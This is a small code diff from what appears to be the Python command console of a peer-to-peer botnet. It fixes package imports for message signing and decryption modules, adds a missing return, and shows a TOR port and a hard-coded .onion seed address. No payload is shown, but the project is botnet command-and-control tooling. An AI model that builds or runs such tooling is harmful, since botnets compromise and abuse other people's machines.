@@ -7,10 +7,10 @@ import argparse
 import cmd2
 from cmd2 import with_argparser, with_category, categorize
 
-from .botnet_p2p import ENCODING
-from .botnet_p2p.message import structure_msg, sign_structured_msg
-from .botnet_p2p.security import decrypt
-from .botnet_p2p.operations import close_terminal
+from botnet_p2p import ENCODING
+from botnet_p2p.message import structure_msg, sign_structured_msg
+from botnet_p2p.security import decrypt
+from botnet_p2p.operations import close_terminal
 
 BUFFER_SIZE = 4096
 TOR_SERVER_PORT = 50001
@@ -27,7 +27,7 @@ seed_directions = ["57yvvr2pfb46zull.onion"]
 
 
 def make_blue(msg: str):
-    f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"
+    return f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"
 
 
 class MyPrompt(cmd2.Cmd):
